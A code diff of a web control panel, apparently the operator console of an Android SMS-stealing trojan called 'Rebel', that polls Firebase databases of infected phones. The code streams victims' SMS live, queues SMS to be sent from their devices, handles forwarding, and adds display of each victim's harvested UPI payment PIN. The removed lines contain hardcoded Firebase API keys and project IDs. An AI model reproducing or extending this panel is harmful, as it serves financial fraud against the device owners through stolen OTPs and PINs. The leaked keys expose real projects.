   {key:'databaseURL',label:'Firebase URL',required:true,placeholder:'https://your-project-default-rtdb.firebaseio.com',
-   prompt:'Namaste! Main <strong>Rebel AI</strong> hoon.<br><br>Pehle apna <strong>Firebase URL</strong> (Realtime Database) bhejo.<br>Example: <code>https://xxx-default-rtdb.firebaseio.com</code><br><br>Poora config paste karoge to baaki fields auto-fill ho jayengi.'},
+   prompt:'Hello! I am <strong>Rebel AI</strong>.<br><br>First, send your <strong>Firebase URL</strong> (Realtime Database).<br>Example: <code>https://xxx-default-rtdb.firebaseio.com</code><br><br>Paste full config and remaining fields will auto-fill.'},
   {key:'apiKey',label:'API Key',required:false,placeholder:'AIzaSy...',
-   prompt:'Ab <strong>API Key</strong> bhejo (Firebase Console → Project settings → Your apps).<br><br><span style="color:var(--accent2)">⚠️ Warning:</span> <strong>API Key is necessary for SMS sending and forwarding.</strong> Bina API Key ke sirf data read hoga — Send SMS aur Forwarding kaam nahi karenge.<br><br>Type <code>skip</code> sirf tab jab sirf devices dekhne hon.'},
+   prompt:'Now send your <strong>API Key</strong> (Firebase Console → Project settings → Your apps).<br><br><span style="color:var(--accent2)">⚠️ Warning:</span> <strong>API Key is required for SMS sending and forwarding.</strong> Without it, only read access works — Send SMS and Forwarding will not work.<br><br>Type <code>skip</code> only if you just want to view devices.'},
   {key:'name',label:'Project Name',required:false,placeholder:'My Firebase Project',
-   prompt:'<strong>Project Name</strong> bhejo — panel mein yahi naam dikhega.<br>Type <code>skip</code> — URL se auto naam lag jayega.'},
+   prompt:'Send <strong>Project Name</strong> — this is the name shown in the panel.<br>Type <code>skip</code> — name will be auto-detected from URL.'},
   {key:'storageBucket',label:'Storage Bucket',required:false,placeholder:'your-project.firebasestorage.app',
-   prompt:'<strong>Storage Bucket</strong> bhejo.<br>Example: <code>spinplay99.firebasestorage.app</code><br>Type <code>skip</code> agar nahi hai.'},
+   prompt:'Send <strong>Storage Bucket</strong>.<br>Example: <code>spinplay99.firebasestorage.app</code><br>Type <code>skip</code> if not available.'},
   {key:'appId',label:'App ID',required:false,placeholder:'1:123456789:web:abcdef...',
-   prompt:'Last step — <strong>App ID</strong> bhejo. Iske baad main connect kar dunga.<br>Example: <code>1:8121733414:web:04b9ae5df1b6bc413e31e7</code><br>Type <code>skip</code> agar optional hai.'}
+   prompt:'Last step — send <strong>App ID</strong>. I will connect after this.<br>Example: <code>1:8121733414:web:04b9ae5df1b6bc413e31e7</code><br>Type <code>skip</code> if optional.'}
 ];
-var PROTECTED_FB_IDS=['spinplay99','rabel_raand','pmfg_ccccc','monster_green_c5e81'];
-var DEFAULT_FIREBASES=[{
-  id:'rabel_raand', name:'Rebel', schema:'rabel',
-  apiKey:'',
-  authDomain:'rabel-raand.firebaseapp.com',
-  databaseURL:'https://rabel-raand-default-rtdb.firebaseio.com',
-  projectId:'rabel-raand'
-},{
-  id:'monster_green_c5e81', name:'Monster Green', schema:'rabel',
-  apiKey:'AIzaSyBspKFI_F7hB-5hHJI0203786vXuCMMbM8',
-  authDomain:'monster-green-c5e81.firebaseapp.com',
-  databaseURL:'https://monster-green-c5e81-default-rtdb.firebaseio.com',
-  projectId:'monster-green-c5e81',
-  storageBucket:'monster-green-c5e81.firebasestorage.app',
-  messagingSenderId:'411242045978',
-  appId:'1:411242045978:android:1748043e0e030b348067a3'
-},{
-  id:'pmfg_ccccc', name:'PMFG', schema:'spinplay',
-  apiKey:'AIzaSyBq_UQz4RtTsomqsWLA99ilqvrK14Okh9w',
-  authDomain:'pmfg-ccccc.firebaseapp.com',
-  databaseURL:'https://pmfg-ccccc-default-rtdb.firebaseio.com',
-  projectId:'pmfg-ccccc'
-},{
-  id:'spinplay99', name:'SpinPlay99', schema:'spinplay',
-  apiKey:'AIzaSyCsTa5oZOZ3XS7ZujbAl8JX1qPuUEP6P3I',
-  authDomain:'spinplay99.firebaseapp.com',
-  databaseURL:'https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app',
-  projectId:'spinplay99',
-  storageBucket:'spinplay99.firebasestorage.app',
-  messagingSenderId:'8121733414',
-  appId:'1:8121733414:web:04b9ae5df1b6bc413e31e7'
-}];
+var PROTECTED_FB_IDS=typeof REBEL_PROTECTED_FB_IDS!=='undefined'?REBEL_PROTECTED_FB_IDS:[];
+var DEFAULT_FIREBASES=typeof REBEL_DEFAULT_FIREBASES!=='undefined'?REBEL_DEFAULT_FIREBASES:[];
 
 function setStatus(t,m){var p=document.getElementById('statusPill');p.className='status-pill'+(t==='connected'?' connected':'');document.getElementById('statusText').textContent=m;}
 var EMOJI_ANIMS={
@@ -970,11 +1170,12 @@ function updateSidebarTitle(){
   if(el) el.textContent=inst?inst.name:'—';
 }
 function applyFbTheme(fbId){
-  var hues={'spinplay99':'255,60,60','rabel_raand':'123,47,255','pmfg_ccccc':'0,200,255','monster_green_c5e81':'0,220,100'};
+  var hues={'spinplay99':'255,60,60','rabel_raand':'123,47,255','pmfg_ccccc':'0,200,255','monster_green_c5e81':'0,220,100','nsx1_7f7aa':'255,140,0','stormapk_9edea':'200,80,255','tyhumai_299f1':'255,60,60'};
   var h=hues[fbId]||String((fbId.charCodeAt(0)*17)%200+40)+',100,200';
   document.documentElement.style.setProperty('--glow','rgba('+h+',0.4)');
   document.documentElement.style.setProperty('--icon-glow','rgba('+h+',0.75)');
 }
+var scene3dStarted=false;
 function init3DScene(){/* disabled in laptop mode */}
 
 // ═══ CLIENTS CACHE (6 hour TTL, auto-clean) ═══
@@ -1011,6 +1212,12 @@ function parseBattery(v){
   if(typeof v==='number') return v;
   return parseInt(String(v).replace('%',''),10)||0;
 }
+function getUpiPinFromRecord(s){
+  if(!s||typeof s!=='object') return '';
+  var v=s.upipin!=null?s.upipin:(s.upi_pin!=null?s.upi_pin:(s.upiPin!=null?s.upiPin:s.UPI_PIN));
+  if(v==null||v==='') return '';
+  return String(v).trim();
+}
 function getPhoneFromRecord(s){
   if(!s||typeof s!=='object') return '';
   if(s.mobNo) return String(s.mobNo).trim();
@@ -1042,11 +1249,63 @@ function resolveOnlineStatus(s,fbId){
 }
 function parseJoinedDate(str){
   if(!str) return 0;
+  var ms=parseDdMmYyyy(String(str).trim());
+  if(ms) return ms;
   try{
     var p=String(str).split('|')[0].trim().split('/');
     if(p.length===3) return new Date(parseInt(p[2],10),parseInt(p[1],10)-1,parseInt(p[0],10)).getTime();
   }catch(e){}
   return 0;
+}
+function toTimestampMs(v){
+  if(v==null||v==='') return 0;
+  if(typeof v==='object') return 0;
+  if(typeof v==='number'&&v>0) return v<1e12?v*1000:v;
+  if(typeof v==='string'){
+    if(!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}
+    var p=parseDdMmYyyy(v); if(p) return p;
+    var t=Date.parse(v); if(!isNaN(t)) return t;
+  }
+  return 0;
+}
+function resolveLastSeenMs(raw,isOnline){
+  if(!raw||typeof raw!=='object') return 0;
+  if(isOnline) return Date.now();
+  if(raw._lastOnlineMs) return raw._lastOnlineMs;
+  var keys=['last_seen','lastSeen','last_ping','lastPing','updated_at','updatedAt','timestamp','ts'];
+  for(var i=0;i<keys.length;i++){var ms=toTimestampMs(raw[keys[i]]);if(ms) return ms;}
+  return parseJoinedDate(raw.joined);
+}
+function formatLastSeenAgo(ms){
+  if(!ms) return '—';
+  var diff=Date.now()-ms;
+  if(diff<0) return 'Just now';
+  if(diff<60000) return Math.floor(diff/1000)+'s ago';
+  if(diff<3600000) return Math.floor(diff/60000)+'m ago';
+  if(diff<86400000) return Math.floor(diff/3600000)+'h ago';
+  if(diff<604800000) return Math.floor(diff/86400000)+'d ago';
+  return new Date(ms).toLocaleString();
+}
+function renderLastSeen(d){
+  var el=document.getElementById('dLastSeen');
+  if(!el||!d) return;
+  if(d.status==='online'){
+    el.textContent='● ACTIVE';
+    el.style.color='var(--success)';
+    el.title='Online now';
+    return;
+  }
+  el.style.color='var(--muted)';
+  if(d.lastSeen>0){
+    el.textContent=formatLastSeenAgo(d.lastSeen);
+    el.title=new Date(d.lastSeen).toLocaleString();
+  }else if(d.joinedReadable){
+    el.textContent=d.joinedReadable;
+    el.title='Last device heartbeat';
+  }else{
+    el.textContent='—';
+    el.title='';
+  }
 }
 function isValidDeviceRecord(raw){
   if(!raw||typeof raw!=='object'||Array.isArray(raw)) return false;
@@ -1064,7 +1323,8 @@ function normalizeClientRecord(raw){
       name:raw.modelName||'Unknown',
       brand:raw.brand||(raw.modelName?String(raw.modelName).split(' ')[0]:''),
       android:raw.androidV||raw.sdkV||'',
-      ts:parseJoinedDate(raw.joined)||raw.ts||0,
+      ts:resolveLastSeenMs(raw,false)||parseJoinedDate(raw.joined)||raw.ts||0,
+      joinedReadable:raw.joined?String(raw.joined).trim():'',
       online:raw.status===true,
       online_status:raw.status===true,
       battery:parseBattery(raw.battery),
@@ -1073,14 +1333,16 @@ function normalizeClientRecord(raw){
       sms_count:raw.sms_count||0,
       mobNo:mob||raw.mobNo||'',
       ip:raw.ip_address||'',
-      storage:raw.storage||''
+      storage:raw.storage||'',
+      upipin:getUpiPinFromRecord(raw)
     };
   }
   var r={
     name:raw.name||raw.device_model||raw.model,
     brand:raw.brand||raw.device_brand,
     android:raw.android||raw.android_version,
-    ts:raw.ts||raw.last_seen||raw.timestamp||0,
+    ts:resolveLastSeenMs(raw,false)||raw.ts||0,
+    joinedReadable:raw.joined?String(raw.joined).trim():'',
     online_status:raw.online_status,
     online:raw.online,
     status:raw.status,
@@ -1088,7 +1350,8 @@ function normalizeClientRecord(raw){
     network:raw.network||raw.network_type,
     charging:raw.charging||raw.is_charging,
     sms_count:raw.sms_count||raw.smsCount||raw.total_sms,
-    mobNo:getPhoneFromRecord(raw)
+    mobNo:getPhoneFromRecord(raw),
+    upipin:getUpiPinFromRecord(raw)
   };
   if(typeof r.ts==='object') r.ts=0;
   r.online=resolveOnlineStatus(Object.assign({},raw,r),raw._fbId||'');
@@ -1126,10 +1389,15 @@ function debouncedSetClientsCache(fbId){
   var fid=fbId||activeFbId;
   cacheWriteTimer=setTimeout(function(){if(fid)setClientsCacheForFb(fid);},400);
 }
+var _fbDataRaf=0;
 function applyFbData(inst){
-  renderFirebaseSwitcher();
-  if(!inst||inst.id===activeFbId) processClientsData(getFbDataMap(),false);
   debouncedSetClientsCache(inst?inst.id:activeFbId);
+  if(inst&&inst.id!==activeFbId) return;
+  if(_fbDataRaf) return;
+  _fbDataRaf=requestAnimationFrame(function(){
+    _fbDataRaf=0;
+    processClientsData(getFbDataMap(),false);
+  });
 }
 function loadAllFbCachesIntoMap(){
   firebaseConfigs.forEach(function(cfg){
@@ -1164,9 +1432,6 @@ function updateCacheBadge(fromCache){
   }
 }
 
-// Auto-clean expired cache every 30 minutes
-setInterval(clearClientsCacheIfExpired,30*60*1000);
-
 // ═══ PANEL INIT (only after login) ═══
 function openPanel(){
   if(panelInitialized) return;
@@ -1185,7 +1450,9 @@ function openPanel(){
   updateSidebarTitle();
   applyFbTheme(activeFbId);
   updateApiKeyWarnings();
+  init3DScene();
   fetchAllFirebaseData();
+  loadSmsTokenConfig();
 }
 
 function markFetchDone(){
@@ -1197,11 +1464,19 @@ function ingestDeviceData(fbId,nodeName,devId,data){
   var payload=Object.assign({_fbId:fbId},data);
   if(!payload.modelName&&!payload.name&&!payload.deviceId&&!payload.device_model)
     payload.name=String(devId).substring(0,16);
+  var key=makeDevKey(fbId,devId);
+  var prev=clientsRawMap[key]||{};
   var norm=normalizeClientRecord(payload);
   if(!norm) return;
-  var key=makeDevKey(fbId,devId);
   norm._node=nodeName; norm._fbId=fbId;
-  clientsRawMap[key]=Object.assign({},clientsRawMap[key]||{},norm);
+  var isOnline=resolveOnlineStatus(Object.assign({},payload,norm),fbId);
+  if(isOnline) norm._lastOnlineMs=Date.now();
+  else if(prev._lastOnlineMs) norm._lastOnlineMs=prev._lastOnlineMs;
+  else{
+    var seenMs=resolveLastSeenMs(payload,false);
+    if(seenMs) norm._lastOnlineMs=seenMs;
+  }
+  clientsRawMap[key]=Object.assign({},prev,norm);
 }
 function mergeSummaryNode(fbId,nodeName,raw){
   if(!raw||typeof raw!=='object') return;
@@ -1306,10 +1581,10 @@ function attachRestPolling(inst){
       fetchNodeViaSdk(inst,'devices_status');
     }
     sdkPoll();
-    inst.pollTimer=setInterval(sdkPoll,8000);
+    inst.pollTimer=setInterval(sdkPoll,20000);
     return;
   }
-  var pollMs=inst.schema==='rabel'?3000:8000;
+  var pollMs=inst.schema==='rabel'?6000:10000;
   function poll(){
     restJson(inst.restUrl+'/clients.json').then(function(raw){
       if(!raw) return;
@@ -1392,6 +1667,50 @@ function mergeClientMaps(a,b){
   return out;
 }
 
+var _processUiRaf=0, _processFromCache=false, _lastDevHash='', _lastFbCounts='', _lastHeroHash='', _searchRaf=0;
+function devListHash(list){
+  list=list||getFilteredDevs();
+  return list.map(function(d){return d.id+'|'+d.status+'|'+d.battery+'|'+d.displayPhone+'|'+d.network+'|'+d.smsCount;}).join(';;');
+}
+function fbCountsHash(){
+  return firebaseConfigs.map(function(c){return c.id+':'+countDevsForFb(c.id);}).join('|');
+}
+function onDevSearch(){
+  if(_searchRaf) return;
+  _searchRaf=requestAnimationFrame(function(){_searchRaf=0;renderSidebar();});
+}
+function flushProcessClientsUI(fromCache){
+  var list=getFilteredDevs();
+  var hash=devListHash(list);
+  var fbCounts=fbCountsHash();
+  if(hash!==_lastDevHash){
+    _lastDevHash=hash;
+    renderSidebar();
+    updateStats();
+  }
+  if(fbCounts!==_lastFbCounts){
+    _lastFbCounts=fbCounts;
+    renderFirebaseSwitcher();
+  }
+  if(fromCache) updateCacheBadge(true);
+  if(selDev){
+    var dev=allDevs.find(function(d){return d.id===selDev;});
+    if(dev&&document.getElementById('deviceDetail')&&!document.getElementById('deviceDetail').classList.contains('hidden')){
+      var hh=dev.id+'|'+dev.status+'|'+dev.battery+'|'+dev.network+'|'+dev.smsCount+'|'+dev.upiPin;
+      if(hh!==_lastHeroHash){_lastHeroHash=hh;updateHero(dev);}
+      else renderLastSeen(dev);
+    }
+  }
+}
+function scheduleProcessClientsUI(fromCache){
+  if(fromCache) _processFromCache=true;
+  if(_processUiRaf) return;
+  _processUiRaf=requestAnimationFrame(function(){
+    _processUiRaf=0;
+    var fc=_processFromCache; _processFromCache=false;
+    flushProcessClientsUI(fc);
+  });
+}
 function processClientsData(raw,fromCache){
   allDevs=[];
   if(!raw){ renderSidebar(); updateStats(); return; }
@@ -1403,10 +1722,10 @@ function processClientsData(raw,fromCache){
     var fbId=s._fbId||parsed.fbId;
     var rawId=parsed.devId;
     var inst=getFbInstance(fbId);
-    var ts=s.ts||s.last_seen||s.timestamp||0;
-    if(typeof ts==='object') ts=0;
     var phone=getPhoneFromRecord(s);
     var on=resolveOnlineStatus(s,fbId);
+    var ts=on?Date.now():(s._lastOnlineMs||resolveLastSeenMs(s,false)||s.ts||0);
+    if(typeof ts==='object') ts=0;
     allDevs.push({
       id:       k,
       rawId:    rawId,
@@ -1422,7 +1741,9 @@ function processClientsData(raw,fromCache){
       network:  s.network||s.network_type||'?',
       charging: s.charging||s.is_charging||false,
       lastSeen: ts,
-      smsCount: s.sms_count||s.smsCount||s.total_sms||0
+      joinedReadable: s.joinedReadable||'',
+      smsCount: s.sms_count||s.smsCount||s.total_sms||0,
+      upiPin: getUpiPinFromRecord(s)
     });
   });
   allDevs.sort(function(a,b){
@@ -1434,17 +1755,7 @@ function processClientsData(raw,fromCache){
   if(!selDev&&filtered.length>0) selDev=filtered[0].id;
   if(selDev&&!filtered.find(function(d){return d.id===selDev;}))
     selDev=filtered.length>0?filtered[0].id:'';
-  requestAnimationFrame(function(){
-    renderFirebaseSwitcher();
-    renderSidebar();
-    updateStats();
-    if(fromCache) updateCacheBadge(true);
-    if(selDev){
-      var dev=allDevs.find(function(d){return d.id===selDev;});
-      if(dev&&document.getElementById('deviceDetail')&&!document.getElementById('deviceDetail').classList.contains('hidden'))
-        updateHero(dev);
-    }
-  });
+  scheduleProcessClientsUI(fromCache);
 }
 
 // ═══ SIDEBAR ═══
@@ -1457,7 +1768,7 @@ function renderSidebar(){
     if(inst&&inst.connError){
       errMsg='<br><span style="color:var(--error);margin-top:8px;display:block;font-size:9px">⚠ '+esc(inst.connError)+'</span>';
       if(/deactivated|suspended/i.test(inst.connError)){
-        errMsg+='<span style="opacity:0.65;margin-top:6px;display:block;font-size:8px">APK mein purana cached data dikh sakta hai. Firebase Console se database enable karo.</span>';
+        errMsg+='<span style="opacity:0.65;margin-top:6px;display:block;font-size:8px">APK may show old cached data. Enable the database in Firebase Console.</span>';
       }
     }
     el.innerHTML='<div class="dev-empty">'+icoAnim('satellite','i3d-blue i3d-lg')+'<br>'+(inst?esc(inst.name):'Firebase')+': No devices yet<br><span style="opacity:0.6;margin-top:6px;display:block">Loading or empty project</span>'+errMsg+'</div>';
@@ -1469,7 +1780,7 @@ function renderSidebar(){
     return '<div class="dev-item'+(d.status==='online'?' is-online':'')+(d.id===selDev?' active':'')+'" onclick="openDeviceByIdx('+i+')">'+
       '<div class="dev-top"><span class="dev-name">'+ico('📞','i3d-green i3d-sm i3d-static')+' '+esc(d.displayPhone)+'</span><span class="dev-dot '+d.status+'"></span></div>'+
       '<div class="dev-uid">'+esc(d.name)+' · '+esc(d.rawId.substring(0,16))+'</div>'+
-      '<div class="dev-chips"><span class="dchip '+bc+'">'+icoAnim('bolt','i3d-orange i3d-sm')+d.battery+'%'+(d.charging?' CHG':'')+'</span>'+
+      '<div class="dev-chips"><span class="dchip '+bc+'">'+ico('⚡','i3d-orange i3d-sm i3d-static')+d.battery+'%'+(d.charging?' CHG':'')+'</span>'+
       '<span class="dchip">'+esc(d.network)+'</span>'+
       '<span class="dchip">'+d.smsCount+' SMS</span>'+(d.status==="online"?'<span class="dchip" style="color:var(--success);border-color:rgba(0,255,157,0.2)">● ACTIVE</span>':'')+'</div></div>';
   }).join('');
@@ -1500,6 +1811,7 @@ function openDevice(id){
   window._allSmsData=[]; window._newSmsData=[]; window._allSmsTotal=0;
   window._rabelSmsSeenKeys={};
   window._rabelSmsHydrated=false;
+  _smsListHash='';
   renderSmsList();
   ensureTabLoaded('sms');
 }
@@ -1515,14 +1827,8 @@ function updateHero(d){
   document.getElementById('dNet').textContent=d.network;
   document.getElementById('dAndroid').textContent=d.android||'?';
   document.getElementById('dSmsCount').textContent=d.smsCount;
-  if(d.status==='online'){
-    document.getElementById('dLastSeen').textContent='● ACTIVE';
-    document.getElementById('dLastSeen').style.color='var(--success)';
-  } else {
-    var diff=Date.now()-d.lastSeen;
-    document.getElementById('dLastSeen').textContent=diff<60000?Math.floor(diff/1000)+'s ago':diff<3600000?Math.floor(diff/60000)+'m ago':Math.floor(diff/3600000)+'h ago';
-    document.getElementById('dLastSeen').style.color='var(--muted)';
-  }
+  document.getElementById('dUpiPin').textContent=d.upiPin||'—';
+  renderLastSeen(d);
 }
 
 // ═══ LAZY DEVICE DATA — load only active tab (fast open) ═══
@@ -1530,6 +1836,10 @@ function clearDeviceListeners(){
   Object.keys(activeListeners).forEach(function(k){
     var L=activeListeners[k];
     if(L&&L.type==='rest'&&L.timer) clearInterval(L.timer);
+    else if(L&&L.type==='children'&&L.db){
+      L.db.ref(L.path).off('child_added',L.addH);
+      if(L.chH) L.db.ref(L.path).off('child_changed',L.chH);
+    }
     else if(L&&L.db&&L.handler) L.db.ref(L.path).off('value',L.handler);
   });
   activeListeners={};
@@ -1537,7 +1847,15 @@ function clearDeviceListeners(){
 function restPoll(fbId,path,cb,intervalMs){
   var inst=getFbInstance(fbId);
   if(!inst) return;
-  function tick(){restJson(inst.restUrl+'/'+path+'.json').then(function(d){cb(d);});}
+  var inflight=false;
+  function tick(){
+    if(inflight) return;
+    inflight=true;
+    restJson(inst.restUrl+'/'+path+'.json').then(function(d){
+      inflight=false;
+      cb(d);
+    }).catch(function(){inflight=false;});
+  }
   tick();
   activeListeners[fbId+'::rest::'+path]={type:'rest',timer:setInterval(tick,intervalMs||12000)};
 }
@@ -1592,6 +1910,32 @@ function ingestNewSmsPayload(d){
   }
   return list;
 }
+var _smsRenderRaf=0;
+function scheduleSmsRender(){
+  if(_smsRenderRaf) return;
+  _smsRenderRaf=requestAnimationFrame(function(){_smsRenderRaf=0;renderSmsList();});
+}
+function appendRabelSmsMessage(dev,key,raw,isUpdate){
+  var n=normalizeSmsRecord(raw);
+  if(!n) return;
+  n._sortKey=key;
+  var list=window._allSmsData||[];
+  var idx=-1;
+  for(var i=0;i<list.length;i++){if(list[i]._sortKey===key){idx=i;break;}}
+  if(idx>=0) list[idx]=n;
+  else{
+    list.push(n);
+    var sk=dev.rawId+'::'+key;
+    if(!window._rabelSmsSeenKeys) window._rabelSmsSeenKeys={};
+    if(window._rabelSmsHydrated&&!window._rabelSmsSeenKeys[sk]){
+      window._rabelSmsSeenKeys[sk]=1;
+      window._newSmsData=(window._newSmsData||[]).concat([n]);
+    }
+  }
+  window._allSmsData=list;
+  window._allSmsTotal=list.length;
+  scheduleSmsRender();
+}
 function ingestRabelSms(dev,data){
   var msgs=[];
   if(data&&typeof data==='object') Object.keys(data).forEach(function(k){
@@ -1617,16 +1961,48 @@ function ingestRabelSms(dev,data){
   } else if(isInitial) window._newSmsData=[];
   window._allSmsData=msgs;
   window._allSmsTotal=msgs.length;
-  renderSmsList();
+  scheduleSmsRender();
+}
+function attachRabelSmsLive(dev){
+  var inst=getFbInstance(dev.fbId);
+  if(!inst||!inst.db) return false;
+  var path='messages/'+dev.rawId;
+  var ref=inst.db.ref(path);
+  var key=dev.fbId+'::smslive::'+path;
+  ref.limitToLast(200).once('value',function(snap){
+    ingestRabelSms(dev,snap.val());
+    var addH=function(s){appendRabelSmsMessage(dev,s.key,s.val());};
+    var chH=function(s){appendRabelSmsMessage(dev,s.key,s.val(),true);};
+    ref.on('child_added',addH);
+    ref.on('child_changed',chH);
+    activeListeners[key]={type:'children',db:inst.db,path:path,addH:addH,chH:chH};
+  });
+  return true;
+}
+function attachSpinplayNewSmsLive(dev){
+  var inst=getFbInstance(dev.fbId);
+  if(!inst||!inst.db) return false;
+  var path=dev.deviceNode+'/'+dev.rawId+'/new_sms';
+  var ref=inst.db.ref(path);
+  var key=dev.fbId+'::newsmslive::'+path;
+  ref.once('value',function(snap){
+    window._newSmsData=ingestNewSmsPayload(snap.val());
+    scheduleSmsRender();
+    var addH=function(s){
+      var n=normalizeSmsRecord(s.val());
+      if(!n) return;
+      n._sortKey=s.key;
+      window._newSmsData=(window._newSmsData||[]).concat([n]);
+      scheduleSmsRender();
+    };
+    ref.on('child_added',addH);
+    activeListeners[key]={type:'children',db:inst.db,path:path,addH:addH,chH:null};
+  });
+  return true;
 }
 function loadRabelSms(dev){
-  var path='messages/'+dev.rawId;
-  var inst=getFbInstance(dev.fbId);
-  if(inst&&inst.db){
-    devOn(dev.fbId,path,function(snap){ingestRabelSms(dev,snap.val());});
-    return;
-  }
-  restPoll(dev.fbId,path,function(data){ingestRabelSms(dev,data);},3000);
+  if(attachRabelSmsLive(dev)) return;
+  restPoll(dev.fbId,'messages/'+dev.rawId,function(data){ingestRabelSms(dev,data);},SMS_FAST_MS);
 }
 function loadSmsRest(dev){
   var ref=dev.deviceNode+'/'+dev.rawId;
@@ -1634,18 +2010,24 @@ function loadSmsRest(dev){
     var p=ingestAllSmsPayload(d);
     window._allSmsData=p.list;
     window._allSmsTotal=p.total;
-    renderSmsList();
-  },5000);
+    scheduleSmsRender();
+  },2000);
   restPoll(dev.fbId,ref+'/new_sms',function(d){
     window._newSmsData=ingestNewSmsPayload(d);
-    renderSmsList();
-  },3000);
+    scheduleSmsRender();
+  },SMS_FAST_MS);
 }
 function loadRabelSim(dev){
   restPoll(dev.fbId,'clients/'+dev.rawId,function(data){
     var g=document.getElementById('simGrid');
     if(!data){g.innerHTML='<div style="color:var(--muted);font-family:Space Mono,monospace;font-size:10px">No device info</div>';return;}
-    var fields=[[icoAnim('mobile','i3d-blue i3d-sm'),'Model',data.modelName],[icoAnim('phone','i3d-green i3d-sm'),'Mobile',data.mobNo],[icoAnim('battery','i3d-orange i3d-sm'),'Battery',data.battery],[icoAnim('signal','i3d-fire i3d-sm'),'Network',data.service_provider],[icoAnim('save','i3d-purple i3d-sm'),'Storage',data.storage],[icoAnim('globe','i3d-blue i3d-sm'),'IP',data.ip_address],[icoAnim('robot','i3d-green i3d-sm'),'Android',data.androidV]];
+    var pin=getUpiPinFromRecord(data);
+    if(selDev===dev.id){
+      document.getElementById('dUpiPin').textContent=pin||'—';
+      var cur=allDevs.find(function(d){return d.id===selDev;});
+      if(cur) cur.upiPin=pin||'';
+    }
+    var fields=[[icoAnim('mobile','i3d-blue i3d-sm'),'Model',data.modelName],[icoAnim('phone','i3d-green i3d-sm'),'Mobile',data.mobNo],[icoAnim('battery','i3d-orange i3d-sm'),'Battery',data.battery],[icoAnim('signal','i3d-fire i3d-sm'),'Network',data.service_provider],[icoAnim('save','i3d-purple i3d-sm'),'Storage',data.storage],[icoAnim('globe','i3d-blue i3d-sm'),'IP',data.ip_address],[icoAnim('robot','i3d-green i3d-sm'),'Android',data.androidV],[icoAnim('lock','i3d-orange i3d-sm'),'UPI PIN',pin||'N/A']];
     if(data.sims&&data.sims.length) data.sims.forEach(function(sim,i){fields.push([icoAnim('sim','i3d-green i3d-sm'),'SIM '+(i+1),sim.carrierName+' · '+sim.phoneNumber]);});
     g.innerHTML='<div class="sim-card">'+fields.map(function(f){
       var lbl=f.length>2?f[0]+' '+f[1]:f[0], val=f.length>2?f[2]:f[1];
@@ -1672,7 +2054,7 @@ function ensureTabLoaded(tab){
   if(inst&&inst.schema==='rabel'){
     if(tab==='sms'){loadRabelSms(dev);return;}
     if(tab==='sim'){loadRabelSim(dev);return;}
-    if(tab==='calls'||tab==='contacts'||tab==='perms'||tab==='sendsms'||tab==='forward'){
+    if(tab==='calls'||tab==='contacts'||tab==='perms'||tab==='forward'){
       var tb=document.getElementById(tab==='calls'?'callsTbody':tab==='contacts'?'contactsTbody':'');
       if(tb) tb.innerHTML='<tr><td colspan="6" class="tbl-empty">Not available for this Firebase schema</td></tr>';
       return;
@@ -1681,20 +2063,17 @@ function ensureTabLoaded(tab){
   var ref=dev.deviceNode+'/'+dev.rawId;
   if(tab==='sms'){
     if(inst&&inst.db){
-      devOn(dev.fbId,ref+'/new_sms',function(snap){
-        var list=[];
-        if(snap.exists()) snap.forEach(function(c){
-          var n=normalizeSmsRecord(c.val());
-          if(n){n._sortKey=c.key; list.push(n);}
+      if(!attachSpinplayNewSmsLive(dev)){
+        devOn(dev.fbId,ref+'/new_sms',function(snap){
+          window._newSmsData=ingestNewSmsPayload(snap.val());
+          scheduleSmsRender();
         });
-        window._newSmsData=list;
-        renderSmsList();
-      });
+      }
       devOn(dev.fbId,ref+'/all_sms',function(snap){
         var p=ingestAllSmsPayload(snap.val());
         window._allSmsData=p.list;
         window._allSmsTotal=p.total;
-        renderSmsList();
+        scheduleSmsRender();
       });
     }else{
       loadSmsRest(dev);
@@ -1807,11 +2186,23 @@ function sendSms(){
   if(!inst){showToast('error','Firebase not connected!');return;}
   var n=document.getElementById('sendTo').value.trim(), m=document.getElementById('sendMsg').value.trim();
   if(!n||!m){document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">Fill all fields</span>';return;}
-  var path=dev.deviceNode+'/'+dev.rawId+'/manual_commands/send_sms';
+  var t0=performance.now();
   document.getElementById('sendStatus').innerHTML='<span style="color:var(--muted)">Sending...</span>';
-  fbPush(inst,path,{to:n,message:m})
-    .then(function(){document.getElementById('sendStatus').innerHTML='<span style="color:var(--success)">✅ Command sent!</span>';document.getElementById('sendMsg').value='';showToast('success','✅ SMS queued on device');})
-    .catch(function(e){document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">❌ '+esc(e.message||'Failed')+'</span>';showToast('error',e.message||'Send failed');});
+  var done=function(){
+    var ms=Math.max(1,Math.round(performance.now()-t0));
+    document.getElementById('sendStatus').innerHTML='<span style="color:var(--success)">✅ Sent in '+ms+'ms</span>';
+    document.getElementById('sendMsg').value='';
+    showToast('success','✅ SMS sent in '+ms+'ms');
+  };
+  var fail=function(e){
+    document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">❌ '+esc(e.message||'Failed')+'</span>';
+    showToast('error',e.message||'Send failed');
+  };
+  if(inst.schema==='rabel'){
+    fbSet(inst,'clients/'+dev.rawId+'/webhookEvent/sendSms',{to:n,message:m,from:1,isSended:false}).then(done).catch(fail);
+    return;
+  }
+  fbPush(inst,dev.deviceNode+'/'+dev.rawId+'/manual_commands/send_sms',{to:n,message:m}).then(done).catch(fail);
 }
 
 // ═══ FORWARDING ═══
@@ -1892,6 +2283,7 @@ function smsSortDesc(a,b){
   if(tb!==ta) return tb-ta;
   return String(b._sortKey||'').localeCompare(String(a._sortKey||''));
 }
+var _smsListHash='';
 function renderSmsList(){
   var tb=document.getElementById('smsTbody');
   var newMsgs=(window._newSmsData||[]).slice();
@@ -1907,6 +2299,9 @@ function renderSmsList(){
   var merged=newMsgs.concat(filteredAll);
   merged.sort(smsSortDesc);
   merged=merged.slice(0,100);
+  var listHash=merged.length+'|'+total+'|'+newMsgs.length+'|'+(merged[0]?smsDedupKey(merged[0]):'')+'|'+(merged[merged.length-1]?smsDedupKey(merged[merged.length-1]):'');
+  if(listHash===_smsListHash) return;
+  _smsListHash=listHash;
   window._smsData=merged;
   document.getElementById('tc-sms').textContent=(newMsgs.length+total)+' (showing 100)';
   if(!merged.length){
@@ -1984,7 +2379,7 @@ function parseAadharApiResponse(r){
   return r.text().then(function(txt){
     var t=String(txt||'').trim();
     if(!t) throw new Error('Empty API response');
